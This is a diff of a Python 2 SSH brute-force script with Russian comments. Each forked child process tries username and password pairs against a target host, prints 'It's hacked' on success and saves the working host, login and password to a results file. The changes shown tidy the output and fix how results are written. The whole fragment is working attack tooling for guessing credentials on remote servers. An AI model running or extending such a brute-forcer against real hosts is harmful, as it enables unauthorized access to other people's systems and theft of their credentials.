@@ -43,23 +43,23 @@ def child(target):	# Дочерний процесс
 			psw = psw.strip()
 			try:
 				client.connect(target, username = lgn, password = psw, timeout=2)
-				print "try 2"
 				stdin, stdout, stderr = client.exec_command('date')
-				print "try 3"
 				#print 'DEBUG:', stdout
 				print '!!! It\'s hacked', target, '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
 				print lgn, psw, '\n'
 				res = target, lgn, psw
-				print type(res)
-				results.write(res)
+				#print type(res)
+				results.write(str(res))
 				
 			except SSHException:
-				print 'Child:', '\t\t', os.getpid(), '\nTarget:', '\t', target, '\nWrong auth:', '\t', lgn, psw, '\n'
+				#print 'Child:', '\t\t', os.getpid(), '\nTarget:', '\t', target, '\nWrong auth:', '\t', lgn, psw, '\n'
+				continue
 			except socket.error:
 				print "\nConnection refused to host", target, '\nGoing to next host\n\n'
 				error='yes'
 				break # skip host if it refused
-	print '\n\nExit and save\n\n'
+				
+	print target, 'checked\n'
 	#results.write(res)
 	results.close()
 	os._exit(0)
@@ -71,8 +71,10 @@ def parent():
 		if newpid == 0:
 			child(trg)
 		#else:
+		#	results.close()
 		#	print newpid, 'else'
 	#os._exit(0)
+
 
 ### MAIN ###
 parent()
